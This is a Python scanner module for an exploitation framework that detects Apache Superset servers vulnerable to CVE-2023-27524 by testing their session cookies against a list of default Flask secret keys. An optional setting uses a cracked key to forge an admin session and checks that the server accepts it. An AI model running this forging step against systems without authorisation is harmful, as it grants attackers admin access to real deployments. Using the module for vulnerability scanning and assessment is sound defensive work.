#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect Apache Superset default Flask SECRET_KEY (CVE-2023-27524, Horizon3)."""

from __future__ import annotations

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client

SECRET_KEYS = [
    b"\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h",
    b"CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET",
    b"thisISaSECRET_1234",
    b"YOUR_OWN_RANDOM_GENERATED_SECRET_KEY",
    b"TEST_NON_DEV_SECRET",
]


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Apache Superset CVE-2023-27524 Default Secret Detect",
        "description": (
            "Horizon3: verifies the session cookie is signed with a known default "
            "Flask SECRET_KEY. Requires optional flask-unsign package."
        ),
        "author": ["Horizon3 Attack Team", "KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2023-27524"],
        "references": [
            "https://github.com/horizon3ai/CVE-2023-27524",
            "https://www.horizon3.ai/cve-2023-27524-insecure-default-configuration-in-apache-superset",
        ],
        "tags": ["web", "scanner", "superset", "auth-bypass"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["risk_signals", "auth_bypass"],
            "chain": {"suggested_followups": ["scanner/http/superset_detect"]},
        },
    }

    validate_login = OptBool(
        False,
        "Forge admin session and expect 302 on /login/ (needs flask-unsign)",
        required=False,
        advanced=True,
    )
    forge_user_id = OptInteger(1, "User id to forge when validate_login is set", required=False, advanced=True)

    def run(self):
        try:
            from flask_unsign import session as flask_session
        except ImportError:
            print_status("Install flask-unsign for CVE-2023-27524 detect")
            return False

        r = self.http_request(method="GET", path="/login/", allow_redirects=False)
        if not r or r.status_code != 200:
            return False

        session_cookie = None
        for c in r.cookies:
            if c.name == "session":
                session_cookie = c.value
                break
        if not session_cookie:
            return False

        try:
            flask_session.decode(session_cookie)
        except Exception:
            return False

        cracked_key = None
        for key in SECRET_KEYS:
            if flask_session.verify(session_cookie, key):
                cracked_key = key
                break
        if not cracked_key:
            return False

        version = "unknown"
        match = re.search(r'&#34;version_string&#34;: &#34;(.*?)&#34', r.text or "")
        if match:
            version = match.group(1)

        reason = f"Superset {version}: session signed with default SECRET_KEY"
        if self.validate_login:
            uid = int(self.forge_user_id or 1)
            forged = flask_session.sign({"_user_id": uid, "user_id": uid}, cracked_key)
            check = self.http_request(
                method="GET",
                path="/login/",
                headers={"Cookie": f"session={forged}"},
                allow_redirects=False,
            )
            if not check or check.status_code != 302:
                print_warning("Forged cookie not accepted — still reporting weak key")
            else:
                reason += "; forged session accepted"

        self.set_info(severity="critical", cve="CVE-2023-27524", reason=reason, path="/login/")
        return True
